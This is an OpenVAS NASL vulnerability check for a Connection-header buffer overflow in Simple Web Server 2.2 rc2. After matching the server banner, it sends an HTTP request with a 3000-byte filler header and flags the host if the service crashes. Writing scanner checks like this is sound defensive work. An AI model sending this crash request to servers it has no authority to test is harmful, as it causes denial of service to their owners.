##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_simple_web_server_conn_header_bof_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Simple Web Server Connection Header Buffer Overflow Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation allows remote attackers to execute arbitrary code
  on the target system or cause a denial of service condition.
  Impact Level: Application";
tag_affected = "Simple Web Server version 2.2 rc2";

tag_insight = "A specially crafted data sent via HTTP header 'Connection:', triggers a
  buffer overflow and executes arbitrary code on the target system.";
tag_solution = "No solution or patch is available as of th 23rd July, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.pmx.it/software/sws.asp";
tag_summary = "This host is running Simple Web Server and is prone to buffer
  overflow vulnerability.";

if(description)
{
  script_id(802916);
  script_version("$Revision: 12 $");
  script_bugtraq_id(54605);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-07-23 16:50:34 +0530 (Mon, 23 Jul 2012)");
  script_name("Simple Web Server Connection Header Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://ghostinthelab.wordpress.com/");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/19937/");
  script_xref(name : "URL" , value : "http://ghostinthelab.wordpress.com/tag/shellcode/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/114892/SimpleWebServer-2.2-rc2-Remote-Buffer-Overflow.html");

  script_description(desc);
  script_summary("Check if Simple Web Server is vulnerable to DoS");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
req = "";
res = "";
host = "";
port = 0;

## Simple Web Server HTTP port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check port state
if(!get_port_state(port)){
  exit(0);
}

## Get Host name
host = get_host_name();
if(!host){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if(!banner || "Server: PMSoftware-SWS" >!< banner){
  exit(0);
}

##Construct a crafted request
req = string("GET / HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Connection: ", crap(data: "A", length: 3000), "\r\n\r\n");

## Send crafted request
res = http_keepalive_send_recv(port:port, data:req);

## Confirm HTTP Port is dead
if(http_is_dead(port:port)){
  security_hole(port);
}
